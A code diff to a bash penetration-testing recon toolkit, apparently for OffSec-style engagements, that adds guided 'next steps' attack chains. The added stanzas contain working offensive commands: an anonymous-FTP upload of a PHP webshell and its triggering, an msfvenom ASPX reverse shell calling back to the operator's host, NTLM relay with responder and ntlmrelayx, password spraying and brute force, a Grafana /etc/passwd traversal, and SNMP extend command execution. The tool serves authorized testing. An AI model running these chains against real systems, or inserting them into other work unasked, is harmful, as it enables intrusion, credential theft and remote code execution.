@@ -308,6 +308,32 @@ declare -A OffSec_HTTP_HEADER_HINTS=(
   ["X-Powered-By:[[:space:]]*Next\\.js"]="Next.js | CVE-2025-29927 middleware auth bypass (<14.2.25 / <15.2.3) via x-middleware-subrequest header"
   ["X-Powered-By:[[:space:]]*Express"]="Express.js | check for CVE-2024-29041 open-redirect and verb-tampering"
   ["X-Powered-By:[[:space:]]*PHP/[45]"]="End-of-life PHP | check for CVE-2019-11043 php-fpm RCE, CVE-2012-1823 php-cgi argv"
+  ["Set-Cookie:[[:space:]]*grafana_session"]="Grafana | CVE-2021-43798 path traversal (v8.0.0–8.3.0) via /public/plugins/<plugin>/../../../../etc/passwd | also check :3000 port for R7 dedicated stanza"
+)
+
+#------------------------------------------------------------------------------
+# WEBENUM STANZA MARKER MAP
+# When emit_kb_header_hints fingerprints a CMS/app at recon time, we want to
+# point the operator at the webenum-generated next_steps.txt section instead of
+# falling back to generic searchsploit. Key = lowercase substring of the KB
+# name; value = literal heading text webenum emits in its own next_steps.txt
+# (see webenum generate_next_steps). Empty value means "handled by a dedicated
+# recon stanza already — skip the webenum lookup" (e.g. SaltStack → R1).
+#------------------------------------------------------------------------------
+declare -A WEBENUM_STANZA_MARKERS=(
+  [jenkins]="Jenkins detected"
+  [webmin]="Webmin detected"
+  [tomcat]="Tomcat manager surface detected"
+  [coyote]="Tomcat manager surface detected"
+  [confluence]="Atlassian Confluence detected"
+  [gitlab]="GitLab detected"
+  [hfs]="Rejetto HFS"
+  [rejetto]="Rejetto HFS"
+  [next.js]="Next.js detected"
+  [nextjs]="Next.js detected"
+  [werkzeug]="Debug framework indicators"
+  [grafana]="Grafana detected"
+  [saltstack]=""
 )
 
 # Generic KB emitter — reads OffSec_SERVICE_HINTS, emits ONE next_steps stanza per
@@ -331,7 +357,8 @@ emit_kb_port_hints() {
             "# KB entry: $hint" \
             "searchsploit $(echo "$name" | awk '{print $1, $2}' | sed 's/ *$//')" \
             "nc -nv $ip $p </dev/null" \
-            "curl -sk ${proto}://$ip:$p/ | head -20"
+            "curl -sk ${proto}://$ip:$p/ | head -20" \
+            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §2 Service / Network Path"
         # Also surface in quick_wins for at-a-glance triage.
         quick_win "$target_dir" "KB: :$p — $hint" "grep -P '^$p/tcp\\s+open' $target_dir/scans/nmap_tcp.nmap"
     done
@@ -355,13 +382,43 @@ emit_kb_header_hints() {
             if grep -qiE "$hdr_pattern" "$headers_file" 2>/dev/null; then
                 hint="${OffSec_HTTP_HEADER_HINTS[$hdr_pattern]}"
                 name=$(echo "$hint" | awk -F'|' '{print $1}' | awk '{$1=$1};1')
-                append_next_finding "$next_file" \
-                    "HTTP header fingerprint :$port — $name" \
-                    "$headers_file matched header pattern: $hdr_pattern" \
-                    "# KB entry: $hint" \
-                    "searchsploit $(echo "$name" | awk '{print $1, $2}' | sed 's/ *$//')" \
-                    "cat $headers_file" \
-                    "curl -sk ${proto}://$ip:$port/ | head -20"
+                # Look up webenum's dedicated stanza for this app. If webenum has
+                # already been run against this IP:port, point at the captured
+                # handoff instead of falling back to a generic searchsploit.
+                local name_lc marker_key web_stanza_marker="" web_next web_host
+                name_lc="${name,,}"
+                web_stanza_marker=""
+                for marker_key in "${!WEBENUM_STANZA_MARKERS[@]}"; do
+                    if [[ "$name_lc" == *"$marker_key"* ]]; then
+                        web_stanza_marker="${WEBENUM_STANZA_MARKERS[$marker_key]}"
+                        break
+                    fi
+                done
+                web_host="$ip"
+                web_next="${TOOLKIT_ROOT:-$HOME/toolkit}/web/${web_host}_${port}_${proto}/artifacts/loot/next_steps.txt"
+                if [[ -n "$web_stanza_marker" ]] && is_nonempty_file "$web_next" && \
+                    grep -q "^## .*${web_stanza_marker}" "$web_next" 2>/dev/null; then
+                    append_next_finding "$next_file" \
+                        "HTTP header fingerprint :$port — $name (see webenum handoff)" \
+                        "$headers_file matched $hdr_pattern; webenum captured full handoff at $web_next" \
+                        "# KB entry: $hint" \
+                        "# Full exploit chain lives in webenum output — read it:" \
+                        "awk '/^## .*${web_stanza_marker}/,/^## /' \"$web_next\" | sed '\$d'" \
+                        "less +/'^## .*${web_stanza_marker}' \"$web_next\"" \
+                        "cat \"$headers_file\"" \
+                        "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §4 Exploit Type Reference"
+                else
+                    append_next_finding "$next_file" \
+                        "HTTP header fingerprint :$port — $name" \
+                        "$headers_file matched header pattern: $hdr_pattern (webenum handoff not present)" \
+                        "# KB entry: $hint" \
+                        "# Run webenum to generate the full exploit chain for this app:" \
+                        "./webenum.sh --url ${proto}://${web_host}:${port}" \
+                        "searchsploit $(echo "$name" | awk '{print $1, $2}' | sed 's/ *$//')" \
+                        "cat \"$headers_file\"" \
+                        "curl -sk ${proto}://$ip:$port/ | head -20" \
+                        "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §4 Exploit Type Reference"
+                fi
                 quick_win "$target_dir" "HTTP-HDR: :$port — $hint" "curl -skIL ${proto}://$ip:$port/  # headers matched /$hdr_pattern/"
             fi
         done
@@ -1416,8 +1473,8 @@ enum_smb() {
         quick_win "$target_dir" "SMB MS17-010 VULNERABLE on $ip" "$_smb_vuln_cmd"
     fi
     if grep -qiE 'message signing.*disabled|message_signing.*disabled|Message signing enabled but not required' "$outdir/nmap_smb_vuln.txt" 2>/dev/null; then
-        success "  ★ SMB signing disabled on $ip — relay candidate ★"
-        quick_win "$target_dir" "SMB SIGNING DISABLED on $ip — relay target" "$_smb_vuln_cmd"
+        success "  ★ SMB signing not required on $ip — relay candidate ★"
+        quick_win "$target_dir" "SMB SIGNING NOT REQUIRED on $ip — relay target" "$_smb_vuln_cmd"
     fi
 
     # --- Extract notable findings ---
@@ -2636,14 +2693,61 @@ generate_quick_wins() {
             fi
         fi
 
-        # --- CMS / framework fingerprint from WhatWeb title + plugin list ---
+        # --- CMS / framework fingerprint from WhatWeb ---
+        # Strategy (most-specific → least-specific):
+        #   1. Named product (WordPress, Exhibitor, Jenkins, ...).
+        #   2. Known app hinted by RedirectLocation path (/exhibitor/, /phpmyadmin/, ...).
+        #   3. Versioned web server (Jetty(1.0), nginx/1.14.2, Apache/2.4.29).
+        # Generic HTTP titles ("Error 404 Not Found", "301 Moved Permanently",
+        # "Welcome to nginx") are never used — they produced noise stanzas with
+        # junk searchsploit queries.
         if is_nonempty_file "$httpdir/whatweb.txt"; then
-            local cms_hit
-            cms_hit=$(grep -oiE 'Title\[[^]]*\]|Mezzanine|WordPress|Joomla|Drupal|Jenkins|GitLab|Grafana|phpMyAdmin|Tomcat|Nagios|Zabbix|OctoberCMS|Magento|Bolt|Ghost|Strapi|ColdFusion|osTicket|RoundCube|SquirrelMail|SolarWinds|ManageEngine|rConfig|LibreNMS|Cacti|WebMin|Webmin|pfSense|Zimbra|Kibana|Elasticsearch|SonarQube|Nexus Repository|Artifactory|Bitbucket|Gitea|Gogs|Moodle|Mantis|BugZilla|Redmine|Confluence|Jira|SharePoint|OWA|Exchange|Citrix|Pulse Secure|FortiGate' \
-                "$httpdir/whatweb.txt" 2>/dev/null | sort -u | head -5 | tr '\n' ' ')
+            local cms_product="" cms_server="" cms_hit=""
+            # Case-insensitive match returns text as it appears in the file
+            # (which may be lowercase from a URL path like /exhibitor/). Normalize
+            # to canonical case via a lookup table so output reads cleanly.
+            cms_product=$(grep -oiE '(Mezzanine|WordPress|Joomla|Drupal|Jenkins|GitLab|Grafana|phpMyAdmin|Tomcat|Nagios|Zabbix|OctoberCMS|Magento|Bolt|Ghost|Strapi|ColdFusion|osTicket|RoundCube|SquirrelMail|SolarWinds|ManageEngine|rConfig|LibreNMS|Cacti|WebMin|Webmin|pfSense|Zimbra|Kibana|Elasticsearch|SonarQube|Artifactory|Bitbucket|Gitea|Gogs|Moodle|Mantis|BugZilla|Redmine|Confluence|Jira|SharePoint|Exchange|Citrix|FortiGate|Exhibitor|ZooKeeper|Consul|Vault|Rancher|Airflow|Kong|Traefik|Prometheus|Alertmanager|Portainer|Rundeck|Couchbase|Splunk|RabbitMQ|Keycloak|OpenCart|PrestaShop|DokuWiki|MediaWiki|Nextcloud|ownCloud|Adminer)' \
+                "$httpdir/whatweb.txt" 2>/dev/null | head -1)
+            if [[ -n "$cms_product" ]]; then
+                cms_product=$(awk -v n="$cms_product" 'BEGIN{
+                    map["mezzanine"]="Mezzanine"; map["wordpress"]="WordPress"; map["joomla"]="Joomla";
+                    map["drupal"]="Drupal"; map["jenkins"]="Jenkins"; map["gitlab"]="GitLab";
+                    map["grafana"]="Grafana"; map["phpmyadmin"]="phpMyAdmin"; map["tomcat"]="Tomcat";
+                    map["nagios"]="Nagios"; map["zabbix"]="Zabbix"; map["octobercms"]="OctoberCMS";
+                    map["magento"]="Magento"; map["bolt"]="Bolt"; map["ghost"]="Ghost";
+                    map["strapi"]="Strapi"; map["coldfusion"]="ColdFusion"; map["osticket"]="osTicket";
+                    map["roundcube"]="RoundCube"; map["squirrelmail"]="SquirrelMail"; map["solarwinds"]="SolarWinds";
+                    map["manageengine"]="ManageEngine"; map["rconfig"]="rConfig"; map["librenms"]="LibreNMS";
+                    map["cacti"]="Cacti"; map["webmin"]="Webmin"; map["pfsense"]="pfSense";
+                    map["zimbra"]="Zimbra"; map["kibana"]="Kibana"; map["elasticsearch"]="Elasticsearch";
+                    map["sonarqube"]="SonarQube"; map["artifactory"]="Artifactory"; map["bitbucket"]="Bitbucket";
+                    map["gitea"]="Gitea"; map["gogs"]="Gogs"; map["moodle"]="Moodle";
+                    map["mantis"]="Mantis"; map["bugzilla"]="BugZilla"; map["redmine"]="Redmine";
+                    map["confluence"]="Confluence"; map["jira"]="Jira"; map["sharepoint"]="SharePoint";
+                    map["exchange"]="Exchange"; map["citrix"]="Citrix"; map["fortigate"]="FortiGate";
+                    map["exhibitor"]="Exhibitor"; map["zookeeper"]="ZooKeeper"; map["consul"]="Consul";
+                    map["vault"]="Vault"; map["rancher"]="Rancher"; map["airflow"]="Airflow";
+                    map["kong"]="Kong"; map["traefik"]="Traefik"; map["prometheus"]="Prometheus";
+                    map["alertmanager"]="Alertmanager"; map["portainer"]="Portainer"; map["rundeck"]="Rundeck";
+                    map["couchbase"]="Couchbase"; map["splunk"]="Splunk"; map["rabbitmq"]="RabbitMQ";
+                    map["keycloak"]="Keycloak"; map["opencart"]="OpenCart"; map["prestashop"]="PrestaShop";
+                    map["dokuwiki"]="DokuWiki"; map["mediawiki"]="MediaWiki"; map["nextcloud"]="Nextcloud";
+                    map["owncloud"]="ownCloud"; map["adminer"]="Adminer";
+                    k=tolower(n); print (k in map) ? map[k] : n
+                }')
+            fi
+            cms_server=$(grep -oiE 'Jetty\([0-9][0-9.]*\)|nginx/[0-9][0-9.]*|Apache/[0-9][0-9.]*|lighttpd/[0-9][0-9.]*|IIS/[0-9][0-9.]*' \
+                "$httpdir/whatweb.txt" 2>/dev/null | sort -u | head -1 | tr '/()' '   ' | awk '{$1=$1};1')
+            if [[ -n "$cms_product" && -n "$cms_server" ]]; then
+                cms_hit="${cms_product} (${cms_server})"
+            elif [[ -n "$cms_product" ]]; then
+                cms_hit="${cms_product}"
+            elif [[ -n "$cms_server" ]]; then
+                cms_hit="${cms_server}"
+            fi
             if [[ -n "$cms_hit" ]]; then
                 quick_win_to "$target_dir" "$tmp_file" \
-                    "CMS/app fingerprint on $ip:$p → ${cms_hit}— see $httpdir/whatweb.txt" \
+                    "CMS/app fingerprint on $ip:$p → ${cms_hit} — see $httpdir/whatweb.txt" \
                     "whatweb ${_proto_p}://$ip:$p/"
             fi
         fi
@@ -2762,7 +2866,8 @@ generate_next_steps() {
                 "timeout 10m ./crackr.sh --hydra smb --target $ip -U $smtp_users_loot -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt" \
                 "timeout 10m ./crackr.sh --hydra winrm --target $ip -U $smtp_users_loot -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt" \
                 "timeout 10m ./crackr.sh --hydra smtp --target $ip -U $smtp_users_loot -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt" \
-                "# If time permits and default-passwords came up empty: ./crackr.sh --hydra <svc> -U $smtp_users_loot -P /usr/share/wordlists/rockyou.txt"
+                "# If time permits and default-passwords came up empty: ./crackr.sh --hydra <svc> -U $smtp_users_loot -P /usr/share/wordlists/rockyou.txt" \
+                "# CHEAT: vault/_CHEATSHEETS/Passwords.md §Remote Password Attacks"
         fi
     fi
 
@@ -2779,15 +2884,43 @@ generate_next_steps() {
                 "smbmap -H $ip -u '' -p ''" \
                 "smbclient -L //$ip -N" \
                 "smbclient //$ip/<SHARE> -N -c 'recurse; ls'" \
-                "mkdir -p /mnt/smb_${ip//./_} && mount -t cifs //$ip/<SHARE> /mnt/smb_${ip//./_} -o guest"
+                "mkdir -p /mnt/smb_${ip//./_} && mount -t cifs //$ip/<SHARE> /mnt/smb_${ip//./_} -o guest" \
+                "# CHEAT: vault/_CHEATSHEETS/Active_Directory.md §1.7 Share Enumeration & GPP Passwords"
         else
             append_next_finding "$next_file" \
                 "SMB detected" \
                 "nmap/progress indicates SMB on $ip" \
+                "# Step 1 — null/guest session attempt (confirm smbmap_null/smbmap_guest output):" \
                 "netexec smb $ip" \
+                "smbmap -H $ip -u '' -p ''" \
+                "smbmap -H $ip -u guest -p ''" \
+                "" \
+                "# DECIDE: null/guest returns READ/WRITE shares → the 'Readable SMB share' stanza fires, use that;" \
+                "# DECIDE: null/guest returns only IPC\$ or NT_STATUS_ACCESS_DENIED → try the fallback enum chain below." \
+                "" \
+                "# Step 2 — fallback user-enum chain (null session returned nothing usable):" \
+                "# 2a — rpcclient null-session user enumeration (works on older Windows + misconfigured Samba):" \
+                "rpcclient -U '' -N $ip -c 'enumdomusers; enumdomgroups; querydominfo; netshareenum'" \
+                "# 2b — LDAP anonymous bind (DC-like targets; check ${target_dir}/tcp/ldap/ for existing dump):" \
+                "ldapsearch -x -H ldap://$ip -s base namingContexts" \
+                "ldapsearch -x -H ldap://$ip -b <BASE_DN> '(objectClass=user)' sAMAccountName | grep -oP '(?<=sAMAccountName: ).*' | sort -u" \
+                "# 2c — SMTP VRFY (if :25 open; existing SMTP stanza may have already produced vrfy_users.txt):" \
+                "[[ -s $target_dir/tcp/smtp/vrfy_users.txt ]] && grep -oP '^VALID:\\s*\\K\\S+' $target_dir/tcp/smtp/vrfy_users.txt | sort -u" \
+                "# 2d — SNMP Windows user list (if SNMP is open with a valid community; existing SNMP stanza may have produced windows_users.txt):" \
+                "[[ -s $target_dir/udp/snmp/windows_users.txt ]] && grep -oP 'STRING:\\s*\"?\\K[^\"]+' $target_dir/udp/snmp/windows_users.txt | sort -u" \
+                "snmpwalk -v2c -c public $ip 1.3.6.1.4.1.77.1.2.25   # only if community is valid" \
+                "" \
+                "# DECIDE: any of 2a–2d yields usernames → save to $target_dir/loot/smb_users.txt and spray:" \
+                "#   ./sprayr.sh -U $target_dir/loot/smb_users.txt -p 'Password1' -t $ip" \
+                "# DECIDE: still zero usernames → kerbrute against common names:" \
+                "#   kerbrute userenum --dc $ip -d <DOMAIN> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt" \
+                "" \
+                "# Step 3 — with creds in hand (from spray, leak, or other stanza):" \
                 "smbmap -H $ip -u <USER> -p '<PASS>'" \
                 "smbclient -L //$ip -U '<DOMAIN>/<USER>%<PASS>'" \
-                "./adr.sh -d <DOMAIN> -u <USER> -p '<PASS>' -dc $ip"
+                "./adr.sh -d <DOMAIN> -u <USER> -p '<PASS>' -dc $ip" \
+                "# CHEAT: vault/_CHEATSHEETS/Active_Recon.md §SMB / RPC Deep Dive" \
+                "# CHEAT: vault/_CHEATSHEETS/Active_Directory.md §1 Enumeration"
         fi
         append_next_finding "$next_file" \
             "SMB vulnerability checks" \
@@ -2796,7 +2929,8 @@ generate_next_steps() {
             "nmap --script smb-vuln-ms08-067 -p 445 $ip" \
             "nmap --script smb2-security-mode -p 445 $ip" \
             "netexec smb $ip -M zerologon" \
-            "netexec smb $ip -M petitpotam"
+            "netexec smb $ip -M petitpotam" \
+            "# CHEAT: vault/_CHEATSHEETS/Active_Directory.md §1.11 Security Controls Enumeration"
 
         if grep -qi 'SMB MS17-010 VULNERABLE' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
             append_next_finding "$next_file" \
@@ -2805,18 +2939,21 @@ generate_next_steps() {
                 "cat $target_dir/tcp/smb/nmap_smb_vuln.txt" \
                 "# OffSec-allowed exploit (manual, not auto):" \
                 "# searchsploit ms17-010   # pick python PoC (e.g. 42315.py)" \
-                "# python3 /usr/share/exploitdb/exploits/windows/remote/42315.py $ip"
+                "# python3 /usr/share/exploitdb/exploits/windows/remote/42315.py $ip" \
+                "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §5 Common engagement Exploit Patterns" \
+                "# TODO: vault has no §MS17-010 — add the 42315.py workflow + auxiliary scanner note"
         fi
 
-        if grep -qi 'SMB SIGNING DISABLED' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
+        if grep -qiE 'SMB SIGNING (DISABLED|NOT REQUIRED)' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
             append_next_finding "$next_file" \
-                "SMB signing disabled — relay candidate" \
+                "SMB signing not required — relay candidate" \
                 "$target_dir/tcp/smb/nmap_smb_vuln.txt shows signing not required" \
                 "# Generate relay target list from all hosts:" \
                 "netexec smb <subnet> --gen-relay-list /tmp/relay_targets.txt" \
                 "# Start responder + ntlmrelayx on Kali:" \
                 "sudo responder -I tun0 -wrf" \
-                "impacket-ntlmrelayx -tf /tmp/relay_targets.txt -smb2support -socks"
+                "impacket-ntlmrelayx -tf /tmp/relay_targets.txt -smb2support -socks" \
+                "# CHEAT: vault/_CHEATSHEETS/Active_Directory.md §1.10 NTLM Relay Attack"
         fi
     fi
 
@@ -2829,7 +2966,8 @@ generate_next_steps() {
             "netexec winrm $ip -u <USER> -p '<PASS>'" \
             "netexec winrm $ip -u <USER> -H '<NTLM_HASH>'" \
             "evil-winrm -i $ip -u <USER> -p '<PASS>'" \
-            "evil-winrm -i $ip -u <USER> -H '<NTLM_HASH>'"
+            "evil-winrm -i $ip -u <USER> -H '<NTLM_HASH>'" \
+            "# CHEAT: vault/_CHEATSHEETS/Active_Directory.md §3.5 WinRM"
     fi
 
     local httpdir
@@ -2850,7 +2988,8 @@ generate_next_steps() {
                 "Web target ready for deeper enumeration" \
                 "$evidence" \
                 "feroxbuster -u $url -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -d 2 -t 50 --timeout 5 --time-limit 10m -o $httpdir/ferox_deep.txt" \
-                "nuclei -u $url -severity critical,high,medium -stats -si 10 -timeout 5 -retries 1 -o $httpdir/nuclei.txt   # optional; requires nuclei installed"
+                "nuclei -u $url -severity critical,high,medium -stats -si 10 -timeout 5 -retries 1 -o $httpdir/nuclei.txt   # optional; requires nuclei installed" \
+                "# CHEAT: vault/_CHEATSHEETS/Web_App.md §0 webenum — Operational Integration"
         fi
 
         if is_nonempty_file "$httpdir/http_methods.txt" && \
@@ -2860,7 +2999,8 @@ generate_next_steps() {
                 "$httpdir/http_methods.txt contains risky method in Allow/Public header" \
                 "curl -skIX OPTIONS $url/" \
                 "nmap --script http-methods -p $p $ip" \
-                "curl -skI -X TRACE $url/ 2>/dev/null | sed -n '1,20p'"
+                "curl -skI -X TRACE $url/ 2>/dev/null | sed -n '1,20p'" \
+                "# CHEAT: vault/_CHEATSHEETS/Web_App.md §2 Find What to Attack"
         fi
 
         if is_nonempty_file "$httpdir/tls_names.txt"; then
@@ -2873,7 +3013,8 @@ generate_next_steps() {
                     "cat $httpdir/tls_names.txt" \
                     "echo '$ip $tls_name' | sudo tee -a /etc/hosts" \
                     "./webenum.sh --url ${proto}://${tls_name}:${p}" \
-                    "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u $url -H 'Host: FUZZ.${tls_name#*.}' -mc 200,301,302,401,403"
+                    "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u $url -H 'Host: FUZZ.${tls_name#*.}' -mc 200,301,302,401,403" \
+                    "# CHEAT: vault/_CHEATSHEETS/Web_App.md §0 webenum — Operational Integration"
             fi
         fi
 
@@ -2888,7 +3029,8 @@ generate_next_steps() {
                         "Discovered vhost" \
                         "$vhost_json contains $vhost" \
                         "echo '$ip $vhost' | sudo tee -a /etc/hosts" \
-                        "./webenum.sh --url ${proto}://${vhost}:${p}"
+                        "./webenum.sh --url ${proto}://${vhost}:${p}" \
+                        "# CHEAT: vault/_CHEATSHEETS/Web_App.md §0 webenum — Operational Integration"
                 done <<< "$vhosts"
             fi
         fi
@@ -2903,7 +3045,52 @@ generate_next_steps() {
             "find $target_dir/tcp/ftp/mirror -maxdepth 5 -type f 2>/dev/null | sort" \
             "# Grep mirror for secrets/keys/creds:" \
             "grep -RniE 'pass|secret|key|token|cred|user' $target_dir/tcp/ftp/mirror 2>/dev/null | head -40" \
-            "find $target_dir/tcp/ftp/mirror -type f \\( -name 'id_rsa*' -o -name '*.kdbx' -o -name '*.ps1' -o -name '*.config' \\) 2>/dev/null"
+            "find $target_dir/tcp/ftp/mirror -type f \\( -name 'id_rsa*' -o -name '*.kdbx' -o -name '*.ps1' -o -name '*.config' \\) 2>/dev/null" \
+            "" \
+            "# Step 2 — test if anonymous can write (classic anon-FTP → webshell pivot):" \
+            "echo 'ftp-write-probe' > /tmp/ftp_probe.txt" \
+            "curl -s --max-time 10 -T /tmp/ftp_probe.txt ftp://anonymous:anon@$ip/ftp_probe.txt && curl -s ftp://anonymous:anon@$ip/ftp_probe.txt" \
+            "" \
+            "# DECIDE: probe file is readable back → FTP root is writable, proceed to step 3;" \
+            "# DECIDE: 550 Permission denied / upload fails → read-only anon, stop after mirror grep." \
+            "" \
+            "# Step 3 — test for FTP root ↔ web root overlap on each discovered HTTP port:" \
+            "for wp_dir in \"$target_dir/tcp/http\"/port_*; do" \
+            "    [[ -d \"\$wp_dir\" ]] || continue" \
+            "    wp=\$(basename \"\$wp_dir\" | sed 's/port_//')" \
+            "    proto=http; case \"\$wp\" in 443|8443|4443|9443) proto=https ;; esac" \
+            "    code=\$(curl -sk --max-time 5 -o /dev/null -w '%{http_code}' \"\${proto}://$ip:\${wp}/ftp_probe.txt\")" \
+            "    echo \"port \${wp}: \${code} (200 = overlap → upload webshell here)\"" \
+            "done" \
+            "" \
+            "# DECIDE: no port returns 200 → no overlap, stop. Upload is useful only for staging payloads (NFS pickup, authorized_keys drop);" \
+            "# DECIDE: a port returned 200 → it's the overlap, proceed to step 4 with that port as OVERLAP_PORT." \
+            "" \
+            "# Step 4 — fires ONLY if step 3 showed an overlap. Pick ONE webshell language based on that port's whatweb (do not run all three):" \
+            "OVERLAP_PORT=<port that returned 200 in step 3>" \
+            "cat $target_dir/tcp/http/port_\${OVERLAP_PORT}/whatweb.txt   # inspect first" \
+            "" \
+            "# DECIDE: whatweb shows PHP / Apache+mod_php / nginx+PHP-FPM → PHP shell, skip the JSP/ASPX DECIDEs below:" \
+            "echo '<?php system(\$_GET[\"cmd\"]); ?>' > /tmp/shell.php && curl -s -T /tmp/shell.php ftp://anonymous:anon@$ip/shell.php" \
+            "" \
+            "# DECIDE: whatweb shows Apache-Coyote / Tomcat / Jetty → JSP shell instead:" \
+            "# Craft shell.jsp (Runtime.exec one-liner — see vault/_CHEATSHEETS/Reverse_Shells.md §JSP), then:" \
+            "# curl -s -T /tmp/shell.jsp ftp://anonymous:anon@$ip/shell.jsp" \
+            "" \
+            "# DECIDE: whatweb shows IIS / ASP.NET → ASPX shell instead (start penelope listener FIRST):" \
+            "# On Kali: penelope -0 -p 4444" \
+            "# msfvenom -p windows/shell_reverse_tcp LHOST=\${KALI_IP} LPORT=4444 -f aspx > /tmp/shell.aspx" \
+            "# curl -s -T /tmp/shell.aspx ftp://anonymous:anon@$ip/shell.aspx" \
+            "" \
+            "# Step 5 — trigger the uploaded shell via the overlap port:" \
+            "# PHP: curl -sk \"http://$ip:\${OVERLAP_PORT}/shell.php?cmd=id\"" \
+            "# JSP: curl -sk \"http://$ip:\${OVERLAP_PORT}/shell.jsp?cmd=id\"" \
+            "# ASPX: curl -sk \"http://$ip:\${OVERLAP_PORT}/shell.aspx\"   # hits penelope listener" \
+            "" \
+            "# Cleanup the write probe when done: curl -s -Q 'DELE ftp_probe.txt' ftp://anonymous:anon@$ip/" \
+            "# CHEAT: vault/_CHEATSHEETS/Active_Recon.md §FTP Anonymous Login Follow-Up" \
+            "# CHEAT: vault/_CHEATSHEETS/Web_App.md §6 File Upload Vulnerabilities" \
+            "# CHEAT: vault/_CHEATSHEETS/Reverse_Shells.md"
     fi
 
     if grep -qi 'FTP vsftpd 2\.3\.4 backdoor' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
@@ -2918,7 +3105,9 @@ generate_next_steps() {
             "# 1) ftp $ip — login as 'user:)' (note the smiley)" \
             "# 2) On failure, port 6200 opens a root shell:" \
             "nc -nv $ip 6200" \
-            "searchsploit vsftpd 2.3.4"
+            "searchsploit vsftpd 2.3.4" \
+            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §2 Service / Network Path" \
+            "# TODO: vault has no §vsftpd-2.3.4 — add the smiley face backdoor workflow"
     fi
 
     if grep -qi 'FTP ProFTPD 1\.3\.5 mod_copy' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
@@ -2928,7 +3117,9 @@ generate_next_steps() {
             "cat $target_dir/tcp/ftp/version_info.txt" \
             "searchsploit proftpd 1.3.5" \
             "# Manual SITE CPFR/CPTO abuse via telnet:" \
-            "# telnet $ip 21 → SITE CPFR /etc/passwd ; SITE CPTO /var/www/html/p.txt"
+            "# telnet $ip 21 → SITE CPFR /etc/passwd ; SITE CPTO /var/www/html/p.txt" \
+            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §2 Service / Network Path" \
+            "# TODO: vault has no §ProFTPD — add SITE CPFR/CPTO chain"
     fi
 
     if grep -qi 'FTP ProFTPD 1\.3\.3c backdoor' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
@@ -2936,7 +3127,8 @@ generate_next_steps() {
             "ProFTPD 1.3.3c backdoor candidate" \
             "$target_dir/tcp/ftp/version_info.txt flagged ProFTPD 1.3.3c" \
             "searchsploit proftpd 1.3.3c" \
-            "# Known backdoor distributed in 1.3.3c source tarball (OSVDB-69562)"
+            "# Known backdoor distributed in 1.3.3c source tarball (OSVDB-69562)" \
+            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §2 Service / Network Path"
     fi
 
     local pop3_port imap_port
@@ -2949,7 +3141,8 @@ generate_next_steps() {
             "nc -nv $ip $pop3_port" \
             "printf 'CAPA\\r\\nQUIT\\r\\n' | nc -nv $ip $pop3_port" \
             "timeout 10m hydra -L <users.txt> -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt -t 4 pop3://$ip" \
-            "# If time permits and default-passwords came up empty: timeout 30m hydra -L <users.txt> -P /usr/share/wordlists/rockyou.txt -t 4 pop3://$ip"
+            "# If time permits and default-passwords came up empty: timeout 30m hydra -L <users.txt> -P /usr/share/wordlists/rockyou.txt -t 4 pop3://$ip" \
+            "# CHEAT: vault/_CHEATSHEETS/Passwords.md §Remote Password Attacks"
     fi
 
     imap_port=$(first_detected_port "$target_dir" 'imap|^143/tcp|^993/tcp')
@@ -2961,7 +3154,8 @@ generate_next_steps() {
             "nc -nv $ip $imap_port" \
             "printf '. CAPABILITY\\r\\n. LOGOUT\\r\\n' | nc -nv $ip $imap_port" \
             "timeout 10m hydra -L <users.txt> -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt -t 4 imap://$ip" \
-            "# If time permits and default-passwords came up empty: timeout 30m hydra -L <users.txt> -P /usr/share/wordlists/rockyou.txt -t 4 imap://$ip"
+            "# If time permits and default-passwords came up empty: timeout 30m hydra -L <users.txt> -P /usr/share/wordlists/rockyou.txt -t 4 imap://$ip" \
+            "# CHEAT: vault/_CHEATSHEETS/Passwords.md §Remote Password Attacks"
     fi
 
     if is_nonempty_file "$target_dir/udp/snmp/valid_community_strings.txt"; then
@@ -2972,7 +3166,27 @@ generate_next_steps() {
             "$target_dir/udp/snmp/valid_community_strings.txt is non-empty" \
             "cat $target_dir/udp/snmp/valid_community_strings.txt" \
             "timeout 10m snmpbulkwalk -v2c -c '${community}' -Cr50 -t 2 -r 1 $ip 2>&1 | tee $target_dir/udp/snmp/snmpwalk_full.txt" \
-            "snmpwalk -v2c -c '${community}' -t 2 -r 1 $ip 1.3.6.1.2.1.25.4.2.1.5"
+            "snmpwalk -v2c -c '${community}' -t 2 -r 1 $ip 1.3.6.1.2.1.25.4.2.1.5" \
+            "" \
+            "# Step 2 — test for writable community (read-only is the norm; writable is a score):" \
+            "snmpset -v2c -c '${community}' $ip SNMPv2-MIB::sysContact.0 s 'pentest'" \
+            "" \
+            "# DECIDE: snmpset returns the new value → writable community confirmed, proceed to step 3;" \
+            "# DECIDE: 'Reason: notWritable' or timeout → community is read-only, stop after step 1 walks." \
+            "" \
+            "# Step 3a — Linux target with net-snmp + extend enabled → arbitrary command execution:" \
+            "snmpset -v2c -c '${community}' $ip 'NET-SNMP-EXTEND-MIB::nsExtendStatus.\"pe\"' i createAndGo 'NET-SNMP-EXTEND-MIB::nsExtendCommand.\"pe\"' s /usr/bin/id 'NET-SNMP-EXTEND-MIB::nsExtendArgs.\"pe\"' s ''" \
+            "snmpwalk -v2c -c '${community}' $ip 'NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"pe\"'" \
